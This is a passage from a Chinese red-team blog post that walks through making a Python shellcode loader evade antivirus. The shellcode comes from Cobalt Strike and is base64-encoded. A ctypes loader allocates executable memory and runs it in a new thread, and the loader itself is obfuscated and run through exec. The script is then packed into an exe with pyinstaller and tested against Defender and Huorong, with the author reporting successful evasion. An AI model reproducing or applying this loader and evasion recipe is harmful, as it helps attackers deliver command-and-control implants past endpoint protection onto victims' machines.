+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">ctypes</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">scbytes</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x90\x90</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="o">.</span><span class="n">restype</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_void_p</span>
+</span></span><span class="line"><span class="cl"><span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">RtlCopyMemory</span><span class="o">.</span><span class="n">argtypes</span> <span class="o">=</span> <span class="p">(</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_void_p</span><span class="p">,</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_void_p</span><span class="p">,</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_size_t</span> <span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">CreateThread</span><span class="o">.</span><span class="n">argtypes</span> <span class="o">=</span> <span class="p">(</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">,</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">,</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_void_p</span><span class="p">,</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">,</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">,</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">POINTER</span><span class="p">(</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">)</span> <span class="p">)</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">space</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">scbytes</span><span class="p">)),</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="mh">0x3000</span><span class="p">),</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="mh">0x40</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">buff</span> <span class="o">=</span> <span class="p">(</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_char</span> <span class="o">*</span> <span class="nb">len</span><span class="p">(</span><span class="n">scbytes</span><span class="p">)</span> <span class="p">)</span><span class="o">.</span><span class="n">from_buffer_copy</span><span class="p">(</span> <span class="n">scbytes</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_void_p</span><span class="p">(</span><span class="n">space</span><span class="p">),</span><span class="n">buff</span><span class="p">,</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">scbytes</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl"><span class="n">handle</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">CreateThread</span><span class="p">(</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_void_p</span><span class="p">(</span><span class="n">space</span><span class="p">),</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span><span class="n">ctypes</span><span class="o">.</span><span class="n">pointer</span><span class="p">(</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_int</span><span class="p">(</span><span class="mi">0</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl"><span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">handle</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+</span></span></code></pre></div><h1 id="0x02-实战">0x02 实战</h1>
+<p>这里就直接实战过免杀的整个过程，主要的思路就是shellcode和loader编码混淆，把python转成exe可执行文件。</p>
+<h2 id="1生成shellcode">1、生成shellcode</h2>
+<p>我们来使用CS生成的shellcode，选择下面的选项：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/python_separation_to_antivirus/1.png" alt="1"></p>
+<p>选择你的监听：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/python_separation_to_antivirus/2.png" alt="2"></p>
+<p>输出选择Python，选其他也可以，我们只是要里面的十六进制shellcode就行：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/python_separation_to_antivirus/3.png" alt="3"></p>
+<p>点击后会在用户的目录生成一个payload.py的文件，里面这一串16进制就是所谓的shellcode了。</p>
+<p>我们需要把shellcode进行一些处理，把原有shellcode的<code>\x</code>去掉：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/python_separation_to_antivirus/5.png" alt="5"></p>
+<p>然后进行base64编码：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/python_separation_to_antivirus/6.png" alt="6"></p>
+<h2 id="2编写loader代码">2、编写Loader代码</h2>
+<p>在这里推荐使用的一套loader：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">ctypes</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span><span class="s1">&#39;shellcode的base64编码&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="o">.</span><span class="n">restype</span><span class="o">=</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_uint64</span>
+</span></span><span class="line"><span class="cl"><span class="n">rwxpage</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_uint64</span><span class="p">(</span><span class="n">rwxpage</span><span class="p">),</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">create_string_buffer</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">handle</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_uint64</span><span class="p">(</span><span class="n">rwxpage</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">handle</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span></span></code></pre></div><p>这里执行可以正常上线，也可以过微软的defender，但是会被火绒秒杀。</p>
+<p>我们可以把loader部分进行编码，把下面的代码进行base64编码：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="o">.</span><span class="n">restype</span><span class="o">=</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_uint64</span><span class="p">;</span><span class="n">rwxpage</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">);</span><span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">ctypes</span><span class="o">.</span><span class="n">c_uint64</span><span class="p">(</span><span class="n">rwxpage</span><span class="p">),</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">create_string_buffer</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">));</span><span class="n">handle</span> <span class="o">=</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">ctypes</span><span class="o">.</span><span class="n">c_uint64</span><span class="p">(</span><span class="n">rwxpage</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span><span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">kernel32</span><span class="o">.</span><span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">handle</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span></span></code></pre></div><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/python_separation_to_antivirus/7.png" alt="7"></p>
+<p>得到最终的Python代码：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">ctypes</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span><span class="s1">&#39;shellcode的base64编码&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">loader</span> <span class="o">=</span> <span class="s2">&#34;Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5WaXJ0dWFsQWxsb2MucmVzdHlwZT1jdHlwZXMuY191aW50NjQ7cnd4cGFnZSA9IGN0eXBlcy53aW5kbGwua2VybmVsMzIuVmlydHVhbEFsbG9jKDAsIGxlbihzaGVsbGNvZGUpLCAweDEwMDAsIDB4NDApO2N0eXBlcy53aW5kbGwua2VybmVsMzIuUnRsTW92ZU1lbW9yeShjdHlwZXMuY191aW50NjQocnd4cGFnZSksIGN0eXBlcy5jcmVhdGVfc3RyaW5nX2J1ZmZlcihzaGVsbGNvZGUpLCBsZW4oc2hlbGxjb2RlKSk7aGFuZGxlID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5DcmVhdGVUaHJlYWQoMCwgMCwgY3R5cGVzLmNfdWludDY0KHJ3eHBhZ2UpLCAwLCAwLCAwKTtjdHlwZXMud2luZGxsLmtlcm5lbDMyLldhaXRGb3JTaW5nbGVPYmplY3QoaGFuZGxlLCAtMSk=&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">exec</span> <span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">loader</span><span class="p">))</span>
+</span></span></code></pre></div><h2 id="3python转exe">3、Python转Exe</h2>
+<p>我们需要安装一个pyinstaller模块：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python -m pip install pyinstaller==3.0
+</span></span><span class="line"><span class="cl">python -m pip install pypiwin32
+</span></span></code></pre></div><p>如果网速太慢的话就用国内的镜像，后面加几个命令，例如：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python -m pip install pypiwin32 -i http://mirrors.aliyun.com/pypi/simple/  --trusted-host mirrors.aliyun.com
+</span></span></code></pre></div><p>执行下面的命令进行打包：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pyinstaller -F exp.py
+</span></span></code></pre></div><p>打包完成后会在dist目录生成exe文件：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/python_separation_to_antivirus/8.png" alt="8"></p>
+<h2 id="4测试免杀效果">4、测试免杀效果</h2>
+<p>微软的defender没啥问题，火绒也正常上线：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/python_separation_to_antivirus/9.png" alt="9"></p>
+<p>CS上线：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/python_separation_to_antivirus/10.png" alt="10"></p>
+<p>查杀率还是不错的：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/python_separation_to_antivirus/11.png" alt="10"></p>
+<h1 id="0x03-参考">0x03 参考</h1>
+<p><a href="https://codeantenna.com/a/NQOnxnH2Pf">https://codeantenna.com/a/NQOnxnH2Pf</a></p>
+<p><a href="https://www.freebuf.com/articles/compliance/290379.html">https://www.freebuf.com/articles/compliance/290379.html</a></p>
+<p><a href="https://github.com/aleenzz/Cobalt_Strike_wiki/blob/master/2-%E7%AC%AC%E4%BA%94%E8%8A%82%5Bpython%20shellcode%20%E5%8A%A0%E8%BD%BD%5D.md">https://github.com/aleenzz/Cobalt_Strike_wiki/blob/master/2-%E7%AC%AC%E4%BA%94%E8%8A%82%5Bpython%20shellcode%20%E5%8A%A0%E8%BD%BD%5D.md</a></p>
+<p><a href="https://gist.github.com/peewpw/8054a64eb4b5cd007a8431a71d698dc3">https://gist.github.com/peewpw/8054a64eb4b5cd007a8431a71d698dc3</a>   64位loader</p>
+<p><a href="https://icode.best/i/17441043786198#h3-10">https://icode.best/i/17441043786198#h3-10</a></p>
+<p><a href="https://www.delftstack.com/howto/python/python-convert-hex-to-byte/">https://www.delftstack.com/howto/python/python-convert-hex-to-byte/</a> byte和十六进制转换</p>
+
+
+            <hr class="bg-gray-300 mt-8">
+
+            
+
+            
+<div class="border-l-4 border-red-400 mx-auto text-gray-500">
+    <div class="copyright">
+        <ul class="list-none">
+            <li>
+                <strong>原文作者：</strong>
+                <a rel="author" href="https://xxe.icu">F0rmat</a>
+            </li>
+            <li style="word-break:break-all">
+                <strong>原文链接：</strong>
+                <a href="https://xxe.icu/python_separation_to_antivirus.html">https://xxe.icu/python_separation_to_antivirus.html</a>
+            </li>
+            <li>
+                <strong>版权声明：</strong>本作品采用
+                <a rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/deed.zh">署名 - 非商业性使用 4.0 国际 (CC BY-NC 4.0)</a>进行许可，非商业转载请注明出处（作者，原文链接），商业转载请联系作者获得授权。
+            </li>
+        </ul>
+    </div>
+ 
+</div>
+
+
+        </div>
+
+        
+        
+
+         
+        
+            <p class="text-gray-500 text-sm text-right pt-1">
+                <span id="busuanzi_container_page_pv">
+                    本文有 <span id="busuanzi_value_page_pv"></span> 次阅读
+                </span>
+            </p>
+        
+
+    </div>
+    
+
+    
+    <hr class="bg-gray-300 dark:bg-gray-300 my-10">
+
+    
+        
+        
+        <div class="comments">
+            <div id="disqus_thread"></div>
+    <script type="text/javascript">
+    (function() {
+      
+      
+      if (window.location.hostname === 'localhost') return;
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      var disqus_shortname = 'forecho-blog';
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+  
+
+  
+    <script src="https://utteranc.es/client.js"
+            repo="Secd0g/comment"
+            issue-term="pathname"
+            theme="github-light"
+            crossorigin="anonymous"
+            async>
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://github.com/utterance">comments powered by utterances.</a></noscript>
+
+  
+        </div>
+
+        <div class="related my-5">
+            
+
+
+<div class="p-8 mt-6 lg:mt-0 rounded shadow bg-white dark:bg-gray-800">
+    <h2 class="font-sans font-bold break-normal text-gray-700 px-2 pb-3 text-xl dark:text-gray-300">相关文章</h2>
+    
+    <li><a href="/sdl.html" class="underline text-yellow-600">SDL(安全开发生命周期)</a></li>
+    
+    <li><a href="/using_bloodhound_under_macos.html" class="underline text-yellow-600">域渗透-MacOS下的BloodHound攻击</a></li>
+    
+    <li><a href="/ad_delegation.html" class="underline text-yellow-600">域渗透-委派攻击原理与实战</a></li>
+    
+    <li><a href="/ad_ptt.html" class="underline text-yellow-600">域渗透-票据传递攻击（Pass the Ticket）</a></li>
+    
+    <li><a href="/ad_spn.html" class="underline text-yellow-600">域渗透-SPN</a></li>
+    
+</div>
+
+        </div>
+
+    
+
+</section>
+
+
+<div class="hidden xl:text-sm xl:block xl:w-1/4 xl:px-6 ">
+
+    <div class="lg:w-full mx-auto items-center justify-between">
+    <div class="bg-white shadow rounded overflow-hidden dark:bg-gray-800">
+        <div class="bg-cover mx-auto w-32 h-32 mt-5 rounded-full" style="background-image: url('https://avatars.githubusercontent.com/u/16066632?v=4')"> </div>
+        
+        <div class="p-4">
+            <p class="text-2xl text-center pb-2">F0rmat</p>
+            <p class="text-sm text-center text-gray-700 dark:text-gray-300">专注于信息安全、内网渗透、红队攻防</p>
+        </div>
+        <div class="flex p-4 border-t text-sm border-gray-300 text-gray-700 dark:text-gray-300">
+            <div class="flex-1 border-r border-gray-600">
+                <p class="text-center">
+                    <span class="font-bold ">
+                        85
+                    </span>
+                    文章
+                </p>
+            </div>
+            <div class="flex-1 text-center">
+                <p class="text-center">
+                    <span class="font-bold">
+                        
+                            60
+                        
+                    </span>
+                    标签
+                </p>
+            </div>
+        </div>
+        <div class="px-4 pb-4 border-t border-gray-300 dark:text-gray-200">
+            <div class="mt-6 pb-16 lg:pb-0 w-4/5 lg:w-full mx-auto flex flex-wrap items-center  text-gray-500">
+                
+                <a href="//github.com/Secd0g" class="hover:text-gray-900 dark:hover:text-gray-100 p-1 text-2xl" target="_blank" title="GitHub"><i class="my-iconfont icon-social-github"></i></a>
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+                
+                <a href="//zhihu.com/people/F0rmat" class="hover:text-gray-900 dark:hover:text-gray-100 p-1 text-2xl" target="_blank" title="zhihu"><i><svg xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 640 512"><style>svg{fill:#bac5d8}</style><path d="M170.54 148.13v217.54l23.43.01 7.71 26.37 42.01-26.37h49.53V148.13H170.54zm97.75 193.93h-27.94l-27.9 17.51-5.08-17.47-11.9-.04V171.75h72.82v170.31zm-118.46-94.39H97.5c1.74-27.1 2.2-51.59 2.2-73.46h51.16s1.97-22.56-8.58-22.31h-88.5c3.49-13.12 7.87-26.66 13.12-40.67 0 0-24.07 0-32.27 21.57-3.39 8.9-13.21 43.14-30.7 78.12 5.89-.64 25.37-1.18 36.84-22.21 2.11-5.89 2.51-6.66 5.14-14.53h28.87c0 10.5-1.2 66.88-1.68 73.44H20.83c-11.74 0-15.56 23.62-15.56 23.62h65.58C66.45 321.1 42.83 363.12 0 396.34c20.49 5.85 40.91-.93 51-9.9 0 0 22.98-20.9 35.59-69.25l53.96 64.94s7.91-26.89-1.24-39.99c-7.58-8.92-28.06-33.06-36.79-41.81L87.9 311.95c4.36-13.98 6.99-27.55 7.87-40.67h61.65s-.09-23.62-7.59-23.62v.01zm412.02-1.6c20.83-25.64 44.98-58.57 44.98-58.57s-18.65-14.8-27.38-4.06c-6 8.15-36.83 48.2-36.83 48.2l19.23 14.43zm-150.09-59.09c-9.01-8.25-25.91 2.13-25.91 2.13s39.52 55.04 41.12 57.45l19.46-13.73s-25.67-37.61-34.66-45.86h-.01zM640 258.35c-19.78 0-130.91.93-131.06.93v-101c4.81 0 12.42-.4 22.85-1.2 40.88-2.41 70.13-4 87.77-4.81 0 0 12.22-27.19-.59-33.44-3.07-1.18-23.17 4.58-23.17 4.58s-165.22 16.49-232.36 18.05c1.6 8.82 7.62 17.08 15.78 19.55 13.31 3.48 22.69 1.7 49.15.89 24.83-1.6 43.68-2.43 56.51-2.43v99.81H351.41s2.82 22.31 25.51 22.85h107.94v70.92c0 13.97-11.19 21.99-24.48 21.12-14.08.11-26.08-1.15-41.69-1.81 1.99 3.97 6.33 14.39 19.31 21.84 9.88 4.81 16.17 6.57 26.02 6.57 29.56 0 45.67-17.28 44.89-45.31v-73.32h122.36c9.68 0 8.7-23.78 8.7-23.78l.03-.01z"/></svg></i></a>
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+                <a href="/atom.xml" class="hover:text-gray-900 dark:hover:text-gray-100 p-1 text-2xl" target="_blank" title="RSS"><i class="my-iconfont icon-feed"></i></a>
+                
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+
+
+
+
+    <div class="flex flex-col justify-between sticky top-0 pt-12 pb-4 -mt-10 text-gray-600 dark:text-gray-400">
+        <div class="bg-white shadow rounded p-4 mt-5 dark:bg-gray-800">
+            
+<p class="text-base font-bold py-2 yg:pb-6 text-gray-700 dark:text-gray-300">文章目录</p>
+    <div class="sticky text-sm" style="top:6em;" id="menu-content">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x00-前言">0x00 前言</a></li>
+    <li><a href="#0x01-shellcode-loader原理">0x01 Shellcode Loader原理</a>
+      <ul>
+        <li><a href="#shellcode">Shellcode</a></li>
+        <li><a href="#loader加载器">loader加载器</a>
+          <ul>
+            <li><a href="#加载器原理">加载器原理</a></li>
+            <li><a href="#32位和64位问题报错">32位和64位问题报错</a></li>
+            <li><a href="#第一种">第一种</a></li>
+            <li><a href="#第二种">第二种</a></li>
+            <li><a href="#第三种">第三种</a></li>
+            <li><a href="#第四种">第四种</a></li>
+            <li><a href="#第五种">第五种</a></li>
+          </ul>
+    </li>
+    <li><a href="#0x02-实战">0x02 实战</a>
+      <ul>
+        <li><a href="#1生成shellcode">1、生成shellcode</a></li>
+        <li><a href="#2编写loader代码">2、编写Loader代码</a></li>
+        <li><a href="#3python转exe">3、Python转Exe</a></li>
+        <li><a href="#4测试免杀效果">4、测试免杀效果</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x03-参考">0x03 参考</a></li>
+  </ul>
+</nav>
+    </div>
+
+        </div>
+    </div>
+   
+</div> 
+
+    </div>
+    
+    
+<footer class="bg-white dark:bg-gray-800 border-gray-400 shadow mt-10">	
+    <div class="container  mx-auto flex py-8">
+        <div class="w-full text-center text-gray-600 dark:text-gray-400">
+            <p>
+                &copy; 2023 <a  class="text-gray-700 dark:text-gray-300 font-semibold" href="https://xxe.icu">F0rmat&#39;s Blog</a> By F0rmat 
+            </p>
+            
+            <p class="pt-1">
+                Powered by <a rel="nofollow noreferer noopener" href="https://gohugo.io/"  class="text-gray-700 dark:text-gray-300 font-semibold" target="_blank">Hugo</a> 
+                Theme based on <a href="https://github.com/forecho/hugo-theme-echo" class="text-gray-700 dark:text-gray-300 font-semibold" target="_blank">Echo</a>
+            </p>
+
+            <span id="busuanzi_container">
+              访客数：<span id="busuanzi_value_site_uv"></span> | 访问量 <span id="busuanzi_value_site_pv"></span>
+            </span>
+
+        </div>
+
+    </div>
+    
+   
+    
+<script src="/js/clipboard.min.js"></script>
+   
+
+</footer>
+
+ <script>
+  window.onload = function() {
+    document.getElementById("nav-toggle").onclick = function() {
+      document.getElementById("nav-content").classList.toggle("hidden");
+    };
+
+    var donate = document.getElementById("btn-donate");
+    if (donate) {
+      donate.onclick = function() {
+        document.getElementById("donate-image").classList.remove("hidden");
+        donate.classList.add("hidden");
+      };
+    }
+
+    var hostname = window.location.hostname;
+    var divs = document.querySelectorAll('a[href^="http"]');
+    [].forEach.call(divs, function(div) {
+      url = div.getAttribute("href");
+      var domain = url
+        .replace("http://", "")
+        .replace("https://", "")
+        .split(/[/?#:]/)[0];
+      if (domain !== hostname) {
+        div.setAttribute("target", "_blank");
+      }
+    });
+  };
+
+   
+  
+  var h = document.documentElement,
+    b = document.body,
+    st = "scrollTop",
+    sh = "scrollHeight",
+    progress = document.querySelector("#progress"),
+    scroll;
+  var scrollpos = window.scrollY;
+  var header = document.getElementById("header");
+  var navcontent = document.getElementById("nav-content");
+
+  document.addEventListener("scroll", function() {
+     
+    scroll = ((h[st] || b[st]) / ((h[sh] || b[sh]) - h.clientHeight)) * 100;
+    progress.style.setProperty("--scroll", scroll + "%");
+
+     
+    scrollpos = window.scrollY;
+
+    if (scrollpos > 10) {
+      navcontent.classList.remove("bg-gray-100");
+    } else {
+      navcontent.classList.add("bg-gray-100");
+    }
+  });
+
+  
+  if (localStorage.theme === 'dark' || (!'theme' in localStorage && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
+      var lightIcon = document.getElementById("light-icon");
+      var darkIcon = document.getElementById("dark-icon"); 
+      lightIcon.classList.add("hidden");
+      darkIcon.classList.remove("hidden");
+      document.querySelector('html').classList.add('dark')
+  }
+
+  document.getElementById('switchTheme').addEventListener('click', function() {
+    let htmlClasses = document.querySelector('html').classList;
+    var lightIcon = document.getElementById("light-icon");
+    var darkIcon = document.getElementById("dark-icon");
+    if(localStorage.theme == 'dark') {
+        htmlClasses.remove('dark');
+        localStorage.removeItem('theme');
+        darkIcon.classList.add("hidden");
+        lightIcon.classList.remove("hidden");
+    } else {
+        htmlClasses.add('dark');
+        lightIcon.classList.add("hidden");
+        darkIcon.classList.remove("hidden");
+        localStorage.theme = 'dark';
+    }
+  });
+</script>
+
+</body>
+
+</html>
